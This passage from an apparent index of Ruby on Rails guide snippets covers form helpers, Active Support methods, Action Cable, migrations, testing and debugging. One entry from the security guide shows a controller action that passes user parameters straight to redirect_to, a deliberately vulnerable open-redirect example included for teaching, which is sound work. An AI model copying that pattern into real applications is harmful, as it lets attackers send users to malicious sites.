templates\nDESCRIPTION: Examples of form_for usage in ERB templates for both standard RESTful routes and custom routes, including specifying HTTP method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_88\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_for @user do |f| %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_for [ :update_name, @user ] do |f| %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_for [ :update_name, @user ], method: :put do |f| %>\n```\n\n----------------------------------------\n\nTITLE: Demodulizing Strings\nDESCRIPTION: Illustrates the `demodulize` method, which extracts the constant name from a fully qualified constant. It returns the rightmost segment of the string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\n\"Product\".demodulize                        # => \"Product\"\n\"Backoffice::UsersController\".demodulize    # => \"UsersController\"\n\"Admin::Hotel::ReservationUtils\".demodulize # => \"ReservationUtils\"\n\"::Inflections\".demodulize                  # => \"Inflections\"\n\"\".demodulize                               # => \"\"\n```\n\n----------------------------------------\n\nTITLE: Durations Added to DateTime in Ruby\nDESCRIPTION: This snippet illustrates how `Duration` objects (from ActiveSupport) can be added to or subtracted from DateTime objects. This leverages calls to `since` or `advance` to handle calendar reform or DST correctly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_165\n\nLANGUAGE: ruby\nCODE:\n```\nnow = DateTime.current\n# => Mon, 09 Aug 2010 23:15:17 +0000\nnow + 1.year\n# => Tue, 09 Aug 2011 23:15:17 +0000\nnow - 1.week\n# => Mon, 02 Aug 2010 23:15:17 +0000\n```\n\nLANGUAGE: ruby\nCODE:\n```\nDateTime.new(1582, 10, 4, 23) + 1.hour\n# => Fri, 15 Oct 1582 00:00:00 +0000\n```\n\n----------------------------------------\n\nTITLE: Configuring MemCacheStore with Server Addresses\nDESCRIPTION: This snippet configures the MemCacheStore, specifying the addresses of the memcached servers.  Multiple server addresses can be provided as arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :mem_cache_store, \"cache-1.example.com\", \"cache-2.example.com\"\n```\n\n----------------------------------------\n\nTITLE: Starting Rails Server with Custom Options\nDESCRIPTION: Demonstrates how to start the Rails server with custom port and environment settings.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails server -e production -p 4000\n```\n\n----------------------------------------\n\nTITLE: Defining an Active Record Callback in Ruby\nDESCRIPTION: Defines an `after_create` callback within the `User` model. This uses the `after_create` macro to specify the `log_new_user` method, which will be automatically executed immediately after a new `User` record is successfully created and saved to the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_create :log_new_user\n\n  private\n    def log_new_user\n      puts \"A new user was registered\"\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Appearance Channel (Client)\nDESCRIPTION: This JavaScript code defines the client-side logic for the `AppearanceChannel` using Action Cable's consumer. It handles connection events, installs and uninstalls event listeners for focus, blur, turbo:load, and visibilitychange, and sends `appear` and `away` messages to the server based on the document's visibility state. The `consumer` object is imported from the `consumer.js` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_22\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/appearance_channel.js\nimport consumer from \"./consumer\"\n\nconsumer.subscriptions.create(\"AppearanceChannel\", {\n  // Called once when the subscription is created.\n  initialized() {\n    this.update = this.update.bind(this)\n  },\n\n  // Called when the subscription is ready for use on the server.\n  connected() {\n    this.install()\n    this.update()\n  },\n\n  // Called when the WebSocket connection is closed.\n  disconnected() {\n    this.uninstall()\n  },\n\n  // Called when the subscription is rejected by the server.\n  rejected() {\n    this.uninstall()\n  },\n\n  update() {\n    this.documentIsActive ? this.appear() : this.away()\n  },\n\n  appear() {\n    // Calls `AppearanceChannel#appear(data)` on the server.\n    this.perform(\"appear\", { appearing_on: this.appearingOn })\n  },\n\n  away() {\n    // Calls `AppearanceChannel#away` on the server.\n    this.perform(\"away\")\n  },\n\n  install() {\n    window.addEventListener(\"focus\", this.update)\n    window.addEventListener(\"blur\", this.update)\n    document.addEventListener(\"turbo:load\", this.update)\n    document.addEventListener(\"visibilitychange\", this.update)\n  },\n\n  uninstall() {\n    window.removeEventListener(\"focus\", this.update)\n    window.removeEventListener(\"blur\", this.update)\n    document.removeEventListener(\"turbo:load\", this.update)\n    document.removeEventListener(\"visibilitychange\", this.update)\n  },\n\n  get documentIsActive() {\n    return document.visibilityState === \"visible\" && document.hasFocus()\n  },\n\n  get appearingOn() {\n    const element = document.querySelector(\"[data-appearing-on]\")\n    return element ? element.getAttribute(\"data-appearing-on\") : null\n  }\n})\n```\n\n----------------------------------------\n\nTITLE: Spanish Currency Symbol Configuration\nDESCRIPTION: YAML configuration for the Spanish currency symbol used in the improper abstraction example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_24\n\nLANGUAGE: yaml\nCODE:\n```\n# config/locales/es.yml\nes:\n  currency: \"€\"\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Mailer Class Manually\nDESCRIPTION: Shows how to manually create a new mailer class called CustomMailer that inherits from ApplicationMailer without using the Rails generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# app/mailers/custom_mailer.rb\nclass CustomMailer < ApplicationMailer\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing acts_as_yaffle Configuration Logic - Ruby Module - Ruby\nDESCRIPTION: Fully implements the acts_as_yaffle class method, adding a configurable cattr_accessor (class attribute accessor) to store the yaffle_text_field name. Uses ActiveSupport's attribute API for inheritance and defaulting, ensuring models can override the attribute via options. Requires ActiveSupport::Concern and is included in model base classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/lib/yaffle/acts_as_yaffle.rb\n\nmodule Yaffle\n  module ActsAsYaffle\n    extend ActiveSupport::Concern\n\n    class_methods do\n      def acts_as_yaffle(options = {})\n        cattr_accessor :yaffle_text_field, default: (options[:yaffle_text_field] || :last_squawk).to_s\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Requiring Engine Stylesheets via CSS Asset Pipeline Directives\nDESCRIPTION: Demonstrates how to include engine stylesheets as dependencies using Asset Pipeline require statements in CSS files. This method allows assets from the engine to be included in the host application's compiled stylesheets.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_62\n\nLANGUAGE: css\nCODE:\n```\n/*\n *= require blorgh/style\n */\n```\n\n----------------------------------------\n\nTITLE: Action Cable Connection Test with Cookies (Ruby)\nDESCRIPTION: This test checks if a connection is established correctly using cookies. It sets the `user_id` cookie and then asserts that the `connection.user_id` is set to the correct value after establishing the connection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_106\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"connects with cookies\" do\n  cookies.signed[:user_id] = \"42\"\n\n  connect\n\n  assert_equal connection.user_id, \"42\"\nend\n```\n\n----------------------------------------\n\nTITLE: Fixing ActionController::Live Module with ActiveSupport::Concern\nDESCRIPTION: Shows how to properly include ActionController::Live in a module using ActiveSupport::Concern. This fixes an issue where streaming controllers in Rails 5 would break in production without proper concern extension.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\n# This is a work-around for streamed controllers performing authentication with Warden/Devise.\n# See https://github.com/plataformatec/devise/issues/2332\n# Authenticating in the router is another solution as suggested in that issue\nclass StreamingSupport\n  include ActionController::Live # this won't work in production for Rails 5\n  # extend ActiveSupport::Concern # unless you uncomment this line.\n\n  def process(name)\n    super(name)\n  rescue ArgumentError => e\n    if e.message == \"uncaught throw :warden\"\n      throw :warden\n    else\n      raise e\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring SHA-1 for Active Record Encryption in Rails 7.1\nDESCRIPTION: Configuration example showing how to maintain SHA-1 compatibility for Active Record Encryption when migrating to Rails 7.1, which is necessary if you used SHA-1 in previous Rails versions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.encryption.hash_digest_class = OpenSSL::Digest::SHA1\n```\n\n----------------------------------------\n\nTITLE: Exim Ingress command line setup\nDESCRIPTION: This command pipes inbound emails to the Action Mailbox Exim ingress, providing the URL of the relay ingress and the ingress password.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_8\n\nLANGUAGE: Bash\nCODE:\n```\n$ bin/rails action_mailbox:ingress:exim URL=https://example.com/rails/action_mailbox/relay/inbound_emails INGRESS_PASSWORD=...\n```\n\n----------------------------------------\n\nTITLE: Loading an Active Support Core Extension individually\nDESCRIPTION: This example shows how to cherry-pick a single Active Support core extension by requiring its specific file. The note indicates where the method `with_indifferent_access` is defined.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"active_support\"\nrequire \"active_support/core_ext/hash/indifferent_access\"\n```\n\n----------------------------------------\n\nTITLE: Generating Comments Controller in Rails Engine (Bash)\nDESCRIPTION: Uses the Rails generator to create a `CommentsController` within the `blorgh` engine namespace. This command scaffolds the controller file, associated view directory, test file, and helper file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate controller comments\n```\n\n----------------------------------------\n\nTITLE: Action Cable Connection Exception Handling in Ruby\nDESCRIPTION: This code demonstrates how to handle exceptions within an Action Cable connection using `rescue_from`. It defines a `report_error` method that sends exception details to an external bug tracking service.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/application_cable/connection.rb\nmodule ApplicationCable\n  class Connection < ActionCable::Connection::Base\n    rescue_from StandardError, with: :report_error\n\n    private\n      def report_error(e)\n        SomeExternalBugtrackingService.notify(e)\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Preparing a Stable Branch for Backporting in Rails\nDESCRIPTION: Commands to check out a stable branch (e.g., 7-0-stable), reset it to match the remote version, and create a new branch for backporting changes. This ensures a clean starting point for the backport.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_48\n\nLANGUAGE: bash\nCODE:\n```\n$ git checkout 7-0-stable\n$ git reset --hard origin/7-0-stable\n$ git checkout -b my-backport-branch\n```\n\n----------------------------------------\n\nTITLE: Verifying Rails Installation within Dev Container (Bash)\nDESCRIPTION: Executes the `rails` command-line interface with the `--version` flag. This command is intended to be run within the terminal provided by VS Code after the project has been reopened in its Dev Container. It verifies that Rails is correctly installed and accessible within the containerized environment, outputting the specific Rails version being used (e.g., Rails 8.1.0).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started_with_devcontainer.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ rails --version\nRails 8.1.0\n```\n\n----------------------------------------\n\nTITLE: Defining Strict Locals in a Partial\nDESCRIPTION: Shows how to define strict locals for a partial using the `<%# locals: (...) -%>` syntax. This allows enforcing the presence and types of local variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_31\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# locals: (article:, theme: \"light\") -%>\n...\n```\n\n----------------------------------------\n\nTITLE: Vulnerable Legacy Redirection in Rails\nDESCRIPTION: This Ruby code demonstrates a vulnerable redirection implementation in a Rails controller. It insecurely passes user parameters directly to the redirect_to method, which can be exploited by attackers to redirect users to malicious sites.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\ndef legacy\n  redirect_to(params.update(action: \"main\"))\nend\n```\n\n----------------------------------------\n\nTITLE: Protecting Encrypted Data During Arbitrary Code Execution - Ruby\nDESCRIPTION: Temporarily disables encryption but prevents overwriting existing encrypted attributes, preserving their integrity. Use this for performing analysis or debugging without risking accidental plaintext storage. Accepts only a block; acts as a context guard.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Encryption.protecting_encrypted_data do\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Manually Running Executor Context with run!/complete! (Ruby)\nDESCRIPTION: Demonstrates how to manually manage Executor context when block-style wrapping is impractical, e.g., with Rack APIs. The code explicitly starts the Executor via `run!`, runs application code, and then ensures completion with `complete!`, even in the presence of exceptions. This guarantees all necessary Rails callbacks and cleanups are handled correctly. Use when block wrapping is unfeasible.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nThread.new do\n  execution_context = Rails.application.executor.run!\n  # your code here\nensure\n  execution_context.complete! if execution_context\nend\n```\n\n----------------------------------------\n\nTITLE: Broadcast to a Model Channel Ruby\nDESCRIPTION: This Ruby code broadcasts a comment to a PostsChannel that is streaming for a specific post. It uses PostsChannel.broadcast_to to send the comment to subscribers of the post's channel.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_15\n\nLANGUAGE: Ruby\nCODE:\n```\nPostsChannel.broadcast_to(@post, @comment)\n```\n\n----------------------------------------\n\nTITLE: Using `p` and `pp` Commands in the Debugger Session (debug gem)\nDESCRIPTION: Demonstrates using the `p` (print) and `pp` (pretty print) commands within the `debug` gem's interactive session (`(rdbg)`). These commands evaluate the given Ruby expression (e.g., `headers`) and display the result. They are particularly useful when a variable name might conflict with a built-in debugger command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_17\n\nLANGUAGE: text\nCODE:\n```\n(rdbg) p headers    # command\n=> {\"X-Frame-Options\"=>\"SAMEORIGIN\", \"X-XSS-Protection\"=>\"1; mode=block\", \"X-Content-Type-Options\"=>\"nosniff\", \"X-Download-Options\"=>\"noopen\", \"X-Permitted-Cross-Domain-Policies\"=>\"none\", \"Referrer-Policy\"=>\"strict-origin-when-cross-origin\"}\n(rdbg) pp headers    # command\n{\"X-Frame-Options\"=>\"SAMEORIGIN\",\n \"X-XSS-Protection\"=>\"1; mode=block\",\n \"X-Content-Type-Options\"=>\"nosniff\",\n \"X-Download-Options\"=>\"noopen\",\n \"X-Permitted-Cross-Domain-Policies\"=>\"none\",\n \"Referrer-Policy\"=>\"strict-origin-when-cross-origin\"}\n(rdbg)\n```\n\n----------------------------------------\n\nTITLE: Rails Create Article Test with Auth Ruby\nDESCRIPTION: Shows how to modify a create article test to include HTTP Basic Authentication headers. This is needed when basic authentication is set up in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\npost articles_url, params: { article: { body: \"Rails is awesome!\", title: \"Hello Rails\" } }, headers: { Authorization: ActionController::HttpAuthentication::Basic.encode_credentials(\"dhh\", \"secret\") }\n```\n\n----------------------------------------\n\nTITLE: Rendering and Parsing HTML Content\nDESCRIPTION: This code renders a view partial and parses the HTML content using the default `:html` parser. It then uses pattern matching to assert the content of a specific HTML element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_87\n\nLANGUAGE: ruby\nCODE:\n```\ntest \"renders HTML\" do\n  article = Article.create!(title: \"Hello, world\")\n\n  render partial: \"articles/article\", locals: { article: article }\n\n  assert_pattern { rendered.html.at(\"main h1\") => { content: \"Hello, world\" } }\nend\n```\n\n----------------------------------------\n\nTITLE: Solid Queue Default Configuration\nDESCRIPTION: This YAML snippet shows the default configuration for Solid Queue, including settings for dispatchers and workers. It defines polling intervals, batch sizes, thread counts, and process concurrency. The `processes` setting fetches the job concurrency from an environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_15\n\nLANGUAGE: YAML\nCODE:\n```\ndefault: &default\n  dispatchers:\n    - polling_interval: 1\n      batch_size: 500\n  workers:\n    - queues: \"*\"\n      threads: 3\n      processes: <%= ENV.fetch(\"JOB_CONCURRENCY\", 1) %>\n      polling_interval: 0.1\n```\n\n----------------------------------------\n\nTITLE: Testing Email Notifications in Rails\nDESCRIPTION: This code snippet demonstrates how to test email notifications in a Rails application using ActionMailer::TestHelper. It checks if the correct number of emails are sent when a product's inventory count is updated, triggering the `notify_subscribers` callback.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_124\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ProductTest < ActiveSupport::TestCase\n  include ActionMailer::TestHelper\n\n  test \"sends email notifications when back in stock\" do\n    product = products(:tshirt)\n\n    # Set product out of stock\n    product.update(inventory_count: 0)\n\n    assert_emails 2 do\n      product.update(inventory_count: 99)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Engine Mount Configuration\nDESCRIPTION: Configuration to mount the engine in a Rails application's routes file\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nmount Blorgh::Engine => \"/blorgh\"\n```\n\n----------------------------------------\n\nTITLE: Getting previous/next day with prev_day/next_day in Rails\nDESCRIPTION: The `prev_day` and `next_day` methods are Rails extensions to the Time class that return a Time object representing the previous or next day respectively, at the same time of day. These methods simplify date manipulation for daily increments or decrements.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_168\n\nLANGUAGE: ruby\nCODE:\n```\nt = Time.new(2010, 5, 8) # => 2010-05-08 00:00:00 +0900\nt.prev_day               # => 2010-05-07 00:00:00 +0900\nt.next_day               # => 2010-05-09 00:00:00 +0900\n```\n\n----------------------------------------\n\nTITLE: Disable DDL Transactions\nDESCRIPTION: Demonstrates how to disable DDL transactions for a specific migration using `disable_ddl_transaction!`. This is necessary when executing SQL queries that cannot be run within a transaction, such as altering enum types.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nclass ChangeEnum < ActiveRecord::Migration[8.1]\n  disable_ddl_transaction!\n\n  def up\n    execute \"ALTER TYPE model_size ADD VALUE 'new_value'\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching on JSON Responses in Tests - Ruby on Rails - Ruby\nDESCRIPTION: Illustrates how integration tests can pattern match parsed JSON responses with either arrays or hashes using Ruby's built-in pattern matching and Minitest's assert_pattern. This works due to indifferent access support in the parsed_body, enabling concise checks on response structure or contents.\n\n- Dependencies: Rails >= 7.1 (with IntegrationTest), Minitest >= 5.18, Ruby >= 2.7\n- Parameters: routes returning JSON, test assertions\n- Input: HTTP GET requests\n- Output: Assertion on the matching pattern of response bodies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/posts.json\"\n\nresponse.content_type         # => \"application/json; charset=utf-8\"\nresponse.parsed_body.class    # => Array\nresponse.parsed_body          # => [{\"id\"=>42, \"title\"=>\"Title\"},...\n\nassert_pattern { response.parsed_body => [{ id: 42 }] }\n\nget \"/posts/42.json\"\n\nresponse.content_type         # => \"application/json; charset=utf-8\"\nresponse.parsed_body.class    # => ActiveSupport::HashWithIndifferentAccess\nresponse.parsed_body          # => {\"id\"=>42, \"title\"=>\"Title\"}\n\nassert_pattern { response.parsed_body => [{ title: /title/i }] }\n```\n\n----------------------------------------\n\nTITLE: Continuing Execution After Setting watch Command\nDESCRIPTION: Shows what happens when continuing execution after setting a watch breakpoint. The debugger stops when the watched variable (@_response_body) changes its value, providing visibility into when and how the variable is modified.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n(rdbg) c    # continue command\n[173, 182] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal.rb\n   173|       body = [body] unless body.nil? || body.respond_to?(:each)\n   174|       response.reset_body!\n   175|       return unless body\n   176|       response.body = body\n   177|       super\n=> 178|     end\n   179|\n   180|     # Tests if render or redirect has already happened.\n   181|     def performed?\n   182|       response_body || response.committed?\n=>#0    ActionController::Metal#response_body=(body=[\"<html><body>You are being <a href=\\\"ht...) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal.rb:178 #=> [\"<html><body>You are being <a href=\\\"ht...\n  #1    ActionController::Redirecting#redirect_to(options=#<Post id: 13, title: \"qweqwe\", content:..., response_options={:allow_other_host=>false}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/redirecting.rb:74\n  # and 82 frames (use `bt' command for all frames)\n\nStop by #0  BP - Watch  #<PostsController:0x00007fce69ca5320> @_response_body =  -> [\"<html><body>You are being <a href=\\\"http://localhost:3000/posts/13\\\">redirected</a>.</body></html>\"]\n(rdbg)\n```\n\n----------------------------------------\n\nTITLE: Camelize String (with lower option)\nDESCRIPTION: This example demonstrates the `camelize` method with the `:lower` option.  This option converts a string to camel case but with the first letter lowercased. It can be used for generating method names in languages like Javascript.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\n\"visual_effect\".camelize(:lower) # => \"visualEffect\"\n```\n\n----------------------------------------\n\nTITLE: Using direct and resolve methods in Rails routing DSL\nDESCRIPTION: New routing methods direct and resolve have been added to the Rails routing DSL for more flexible route definition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\nRails.application.routes.draw do\n  direct(:homepage) { \"/home\" }\n  resolve(\"User\") { [:user] }\nend\n```\n\n----------------------------------------\n\nTITLE: Setting Permanent Cookies in Rails\nDESCRIPTION: This snippet demonstrates how to create a cookie that never expires (expires in 20 years) using the `permanent` cookie jar.  These cookies are suitable for storing long-term user preferences.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\ncookies.permanent[:locale] = \"fr\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Blob Path from Background Jobs in Rails\nDESCRIPTION: Shows how to generate a blob path from outside controller/view context, such as in background jobs or cron jobs, by accessing the URL helpers through the Rails application routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.url_helpers.rails_blob_path(user.avatar, only_path: true)\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Collection Radio Buttons\nDESCRIPTION: This HTML snippet shows the output of the `collection_radio_buttons` helper. It consists of radio button inputs and labels for Berlin, Chicago, and Madrid.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_55\n\nLANGUAGE: html\nCODE:\n```\n<input type=\"radio\" value=\"1\" name=\"person[city_id]\" id=\"person_city_id_1\">\n<label for=\"person_city_id_1\">Berlin</label>\n\n<input type=\"radio\" value=\"3\" name=\"person[city_id]\" id=\"person_city_id_3\">\n<label for=\"person_city_id_3\">Chicago</label>\n\n<input type=\"radio\" value=\"2\" name=\"person[city_id]\" id=\"person_city_id_2\">\n<label for=\"person_city_id_2\">Madrid</label>\n```\n\n----------------------------------------\n\nTITLE: Creating Join Model for has_many :through Association in Rails\nDESCRIPTION: Demonstrates how to create a migration for a join model used in a has_many :through association. Unlike has_and_belongs_to_many join tables, this creates a full model with an ID and can include additional attributes like appointment_date.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_99\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAppointments < ActiveRecord::Migration[8.1]\n  def change\n    create_table :appointments do |t|\n      t.belongs_to :physician\n      t.belongs_to :patient\n      t.datetime :appointment_date\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Role-based Mass Assignment in ActiveRecord\nDESCRIPTION: Shows how to use role-based mass assignment security by specifying different accessible attributes for different roles\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nclass Post < ActiveRecord::Base\n  attr_accessible :title\n  attr_accessible :title, :published_at, :as => :admin\nend\n\nPost.new(params[:post], :as => :admin)\n```\n\n----------------------------------------\n\nTITLE: Request-Based Constraints (Ruby)\nDESCRIPTION: Constrains a route based on the subdomain of the request. This example matches requests to the `admin` subdomain.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos\", to: \"photos#index\", constraints: { subdomain: \"admin\" }\n```\n\n----------------------------------------\n\nTITLE: Generating a Migration for UUID Primary Key - Bash\nDESCRIPTION: This command generates a new Rails migration named `CreateAuthors`. When UUIDs are enabled, Rails will create a migration that defines the `id` column as type UUID.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_79\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails g migration CreateAuthors\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Connection (Ruby ENV)\nDESCRIPTION: This Ruby code shows how to set the DATABASE_URL environment variable to configure a database connection. It uses a URL format containing the adapter, host, database name, and pool size. This demonstrates configuring the database connection through environment variables.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_80\n\nLANGUAGE: Ruby\nCODE:\n```\nENV[\"DATABASE_URL\"] # => \"postgresql://localhost/blog_development?pool=5\"\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent: Find Multiple Customers by Composite IDs\nDESCRIPTION: SQL query equivalent to the ActiveRecord `Customer.find([[1, 8], [7, 15]])` call, when the Customer model uses a composite primary key of store_id and id. It selects customers whose composite key matches either [1, 8] or [7, 15].\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_13\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (store_id = 1 AND id = 8 OR store_id = 7 AND id = 15)\n```\n\n----------------------------------------\n\nTITLE: Original SQL Query with Order (SQL)\nDESCRIPTION: This SQL query represents the original query before the `unscope(:order)` method was applied. It selects all columns from the `books` table where the `id` is greater than 100, orders the results by `id` in descending order, and limits the result to 20 rows.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_101\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE id > 100 ORDER BY id desc LIMIT 20\n```\n\n----------------------------------------\n\nTITLE: Preloading Collapsed Directory for STI Models\nDESCRIPTION: Configuration to preload STI models from a collapsed directory structure while maintaining simple class names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/preload_stis.rb\n\nshapes = \"#{Rails.root}/app/models/shapes\"\nRails.autoloaders.main.collapse(shapes) # Not a namespace.\n\nunless Rails.application.config.eager_load\n  Rails.application.config.to_prepare do\n    Rails.autoloaders.main.eager_load_dir(shapes)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Fragment Caching in Action Mailer Views\nDESCRIPTION: Configuration to enable fragment caching support in Action Mailer views, a new feature in Rails 5 that allows caching portions of email templates.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.perform_caching = true\n```\n\n----------------------------------------\n\nTITLE: Internal Linking Conventions - Markdown\nDESCRIPTION: Provides examples contrasting poor and effective Markdown internal links, recommending precise link targets describing destination content. Mainly for documentation authors, without dependencies except Markdown syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_5\n\nLANGUAGE: markdown\nCODE:\n```\n# BAD\nWe will cover this [below](#multiple-callback-conditions).\n\n# GOOD\nWe will cover this in the [multiple callback conditions\nsection](#multiple-callback-conditions) shown below.\n```\n\n----------------------------------------\n\nTITLE: Grouping Records in Rails\nDESCRIPTION: Demonstrates how to use the `group` method to group records based on a specific column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_93\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.select(\"created_at\").group(\"created_at\")\n```\n\n----------------------------------------\n\nTITLE: HTML Output of Time Zone Select\nDESCRIPTION: This snippet shows the HTML output generated by the `time_zone_select` helper.  It provides a list of timezone options, 